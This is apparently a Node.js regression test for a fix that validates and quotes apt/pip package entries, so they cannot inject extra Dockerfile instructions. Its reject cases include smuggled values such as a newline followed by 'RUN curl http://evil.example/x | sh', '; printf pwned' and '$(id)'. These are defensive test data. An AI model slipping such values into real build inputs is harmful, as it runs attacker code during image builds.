#!/usr/bin/env node
/**
 * Review A4 (decision D31): `modal_run` joined image_apt / image_pip entries
 * unquoted into Dockerfile RUN lines, so an entry with a newline or `;` became
 * extra build instructions. Entries are now checked against strict package-name
 * patterns, and quoted when they are written.
 */
import assert from 'node:assert/strict'

process.env.MODAL_TOKEN_ID = 'ak-fake'
process.env.MODAL_TOKEN_SECRET = 'as-fake'
const { buildImageCommands, checkImagePackages, validateAptPackages, validatePipRequirements } = await import('../image-packages.js')
const { applyModalRun } = await import('../modal-run.js')

let passed = 0
async function check(label, fn) {
  try {
    await fn()
    passed += 1
  } catch (error) {
    console.error(`FAIL  ${label}\n${error.stack}`)
    process.exitCode = 1
  }
}

await check('ordinary apt package names pass', () => {
  for (const name of ['git', 'libgl1-mesa-glx', 'g++', 'python3.11-dev', 'libssl-dev=3.0.2-0ubuntu1.10', 'zlib1g-dev:amd64']) {
    assert.deepEqual(validateAptPackages([name]).errors, [], name)
  }
})

await check('ordinary pip requirements pass', () => {
  for (const spec of ['numpy', 'scikit-learn==1.5.2', 'torch>=2.1,<3', 'pandas[excel]~=2.2', 'Pillow', 'typing_extensions!=4.6.0', 'my.pkg-name_2>=0.1.dev3']) {
    assert.deepEqual(validatePipRequirements([spec]).errors, [], spec)
  }
})

await check('the review reproductions are rejected: newline + RUN, and `; printf ... #`', () => {
  assert.equal(validateAptPackages(['git\nRUN curl http://evil.example/x | sh']).errors.length, 1)
  assert.equal(validatePipRequirements(['numpy; printf pwned > /tmp/x #']).errors.length, 1)
})

await check('shell metacharacters, options, URLs and whitespace are rejected', () => {
  for (const bad of ['git && curl x', 'git;ls', 'git|sh', '$(id)', '`id`', 'git>out', '-y', '--allow-unauthenticated', 'git curl', ' git', 'git ', '', 'a'.repeat(200), '../x', 'git\ttab']) {
    assert.ok(validateAptPackages([bad]).errors.length >= 1, `apt accepted ${JSON.stringify(bad)}`)
  }
  for (const bad of ['numpy && ls', 'numpy;ls', '-r requirements.txt', '--index-url=http://evil', 'git+https://evil.example/x.git', 'https://evil.example/x.whl', 'pkg @ https://evil.example/x', 'numpy numpy', "numpy'", 'numpy"', '$(id)', '`id`', '', 'numpy\nflask', './local', '..\\x']) {
    assert.ok(validatePipRequirements([bad]).errors.length >= 1, `pip accepted ${JSON.stringify(bad)}`)
  }
})

await check('non-string entries and oversized lists are rejected', () => {
  assert.equal(validateAptPackages([42]).errors.length, 1)
  assert.equal(validatePipRequirements([null]).errors.length, 1)
  assert.equal(validatePipRequirements(Array.from({ length: 200 }, (_, i) => `pkg${i}`)).errors.length, 1)
  assert.deepEqual(validateAptPackages(undefined).errors, [])
  assert.deepEqual(validatePipRequirements([]).errors, [])
})

await check('every entry is quoted in the Dockerfile lines, so a version spec cannot redirect output', () => {
  const lines = buildImageCommands({ apt: ['git', 'libssl-dev=3.0.2'], pip: ['numpy>=1.2,<2', 'pandas[excel]'] })
  assert.equal(lines.length, 2)
  assert.equal(lines[0], "RUN apt-get update && apt-get install -y 'git' 'libssl-dev=3.0.2' && rm -rf /var/lib/apt/lists/*")
  assert.equal(lines[1], "RUN pip install --no-cache-dir 'numpy>=1.2,<2' 'pandas[excel]'")
  for (const line of lines) assert.equal(line.split('\n').length, 1, 'one instruction per line')
})

await check('no packages means no extra build instructions', () => {
  assert.deepEqual(buildImageCommands({}), [])
  assert.deepEqual(buildImageCommands({ apt: [], pip: [] }), [])
})

await check('checkImagePackages names the offending field and entry', () => {
  const problem = checkImagePackages({ image_apt: ['git', 'bad;name'], image_pip: ['numpy'] })
  assert.match(problem, /image_apt/)
  assert.match(problem, /bad;name/)
  assert.equal(checkImagePackages({ image_apt: ['git'], image_pip: ['numpy==1.26.4'] }), null)
})

await check('modal_run refuses a bad entry before it loads the SDK or builds anything', async () => {
  const tools = []
  applyModalRun({ tools: { register: (t) => tools.push(t) } })
  const tool = tools.find((t) => t.name === 'modal_run')
  const result = await tool.execute({ command: 'echo hi', image_apt: ['git\nRUN id'] }, { agent: { session: { header: { cwd: process.cwd() } } }, signal: undefined })
  assert.equal(result.error, 'invalid_package')
  assert.match(result.text, /image_apt/)
  const pip = await tool.execute({ command: 'echo hi', image_pip: ['numpy; id #'] }, { agent: { session: { header: { cwd: process.cwd() } } }, signal: undefined })
  assert.equal(pip.error, 'invalid_package')
})

if (process.exitCode) console.error('image packages: FAILED')
else console.log(`image packages: ${passed} checks passed`)
